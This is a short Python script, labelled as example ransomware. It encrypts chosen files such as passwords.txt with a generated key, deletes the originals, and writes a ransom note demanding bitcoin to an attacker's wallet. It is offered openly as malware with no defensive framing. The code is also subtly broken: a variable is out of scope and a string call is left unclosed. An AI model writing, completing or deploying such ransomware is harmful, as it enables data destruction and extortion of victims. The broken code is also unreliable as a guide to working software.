#!/usr/bin/env python3
"""
Example basic ransomware.
"""

import os, sys, random, string, time
from cryptography.fernet import Fernet

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        encrypted_data = cipher_suite.encrypt(data)
        
        with open(file_path + ".encrypted", 'wb') as f:
            f.write(encrypted_data)
            
        os.remove(file_path)  # Remove original
        
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

def main():
    try:
        key = Fernet.generate_key()  # Create encryption key
        cipher_suite = Fernet(key)
        
        important_files = ["passwords.txt", "notes.pdf"]  # Customize target files
        
        for f in important_files:
            if os.path.exists(f):
                print(f"Encrypting {f}...")
                encrypt_file(f, key)
                
        # Create ransom note
        with open("README.txt", 'w') as f:
            f.write("""
Your most sensitive documents have been encrypted!
To decrypt: Send 0.1 BTC to [ATTACKER'S WALLET]"""
        
        print("[+] Ransom payload created!")
    
    except Exception as e:
        print(f"Fatal error: {e}")

if __name__ == "__main__":
    main()